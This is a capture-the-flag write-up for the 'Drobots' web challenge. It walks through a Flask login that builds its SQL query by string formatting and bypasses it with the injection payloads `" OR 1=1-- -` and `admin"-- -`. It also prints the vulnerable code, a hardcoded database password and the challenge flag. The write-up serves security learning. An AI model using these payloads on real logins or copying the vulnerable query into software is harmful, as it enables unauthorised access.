# Drobots

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Pandora's latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318213226.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318213450.png)

In here, we see there's a **login page**.

When I deal with a login page, I'll always try doing SQL injection to bypass the authentication.

**Some simple `' OR 1=1-- -` may do the job:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318213938.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318213943.png)

Ah Nope.

**Let's read the [source code](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Web/Drobots/web_drobots.zip)!**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Drobots)-[2023.03.18|21:39:56(HKT)]
└> unzip web_drobots.zip 
Archive:  web_drobots.zip
   creating: web_drobots/
   creating: web_drobots/config/
  inflating: web_drobots/config/supervisord.conf  
  inflating: web_drobots/Dockerfile  
  inflating: web_drobots/build-docker.sh  
 extracting: web_drobots/flag.txt    
   creating: web_drobots/challenge/
  inflating: web_drobots/challenge/run.py  
   creating: web_drobots/challenge/application/
   creating: web_drobots/challenge/application/blueprints/
  inflating: web_drobots/challenge/application/blueprints/routes.py  
  inflating: web_drobots/challenge/application/config.py  
  inflating: web_drobots/challenge/application/util.py  
  inflating: web_drobots/challenge/application/database.py  
   creating: web_drobots/challenge/application/static/
   creating: web_drobots/challenge/application/static/css/
  inflating: web_drobots/challenge/application/static/css/bootstrap.min.css  
  inflating: web_drobots/challenge/application/static/css/style.css  
   creating: web_drobots/challenge/application/static/images/
  inflating: web_drobots/challenge/application/static/images/logo.png  
   creating: web_drobots/challenge/application/static/js/
  inflating: web_drobots/challenge/application/static/js/script.js  
  inflating: web_drobots/challenge/application/static/js/jquery.js  
   creating: web_drobots/challenge/application/templates/
  inflating: web_drobots/challenge/application/templates/home.html  
  inflating: web_drobots/challenge/application/templates/login.html  
  inflating: web_drobots/challenge/application/main.py  
  inflating: web_drobots/entrypoint.sh
```

**In `application/blueprints/routes.py`, we see some interesting stuff:**
```py
from flask import Blueprint, render_template, request, session, redirect
from application.database import login
from application.util import response, isAuthenticated
[...]
flag = open('/flag.txt').read()
[...]
@web.route('/home')
@isAuthenticated
def home():
    return render_template('home.html', flag=flag)
```

**The `/home` route (endpoint) will return the flag**. However, we need to be **authenticated**!

```py
@api.route('/login', methods=['POST'])
def apiLogin():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = login(username, password)
    
    if user:
        session['auth'] = user
        return response('Success'), 200
        
    return response('Invalid credentials!'), 403
```

**In the `/login` route, we see it's using a fuction called `login()`, which is from `application.database`:**
```py
from colorama import Cursor
from application.util import createJWT
from flask_mysqldb import MySQL

mysql = MySQL()

def query_db(query, args=(), one=False):
    cursor = mysql.connection.cursor()
    cursor.execute(query, args)
    rv = [dict((cursor.description[idx][0], value)
        for idx, value in enumerate(row)) for row in cursor.fetchall()]
    return (rv[0] if rv else None) if one else rv


def login(username, password):
    # We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)

    if user:
        token = createJWT(username)
        return token
    else:
        return False
```

And oh! There's a Python comment: "We should update our code base and use techniques like parameterization to avoid SQL Injection".

As you can see, the SQL query is directly concatenated ***without using prepare statement (parameterization), or at least sanitized.***

## Exploitation

**That being said, we can bypass the authentication by using the following payload in the username field:**
```sql
" OR 1=1-- -
```

- The `"` is to escape the query string. So that the injected SQL query will become:

**Username: `anything"`:**
```sql
SELECT password FROM users WHERE username = "anything"" AND password = "password"
```

Then, the `OR 1=1` will always evaluate to `True`, which means we pass the check.

Next, the `-- -` is to comment out the rest of the SQL query.

**Hence, the injected SQL query will become:**
```sql
SELECT password FROM users WHERE username = "" OR 1=1-- -" AND password = "{password}"
```

However, **instead of using `OR 1=1`**, I wanna try something different:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318215244.png)

> From [Tib3rius tweet](https://twitter.com/0xTib3rius/status/1624819441044185088).

That being said, if we know the correct username, we can login as that user without using the stupid `OR 1=1`.

**In the `entrypoint.sh`, we found the MySQL schema:**
```bash
function genPass() {
    echo -n $RANDOM | md5sum | head -c 32
}

mysql -u root << EOF
CREATE DATABASE drobots;
CREATE TABLE drobots.users (
    id INTEGER PRIMARY KEY AUTO_INCREMENT,
    username varchar(255) NOT NULL UNIQUE,
    password varchar(255) NOT NULL
);
INSERT INTO drobots.users (username, password) VALUES ('admin', '$(genPass)');
CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
GRANT SELECT, INSERT, UPDATE ON drobots.users TO 'user'@'localhost';
FLUSH PRIVILEGES;
EOF
```

In here, we see there's a user called `admin`!!

**That being said, we can bypass the authentication and login as admin!**
```sql
admin"-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318215601.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318215610.png)

Nice! We successfully bypassed it and got the flag!

- **Flag: `HTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}`**

## Conclusion

What we've learned:

1. Authentication Bypass Via SQL Injection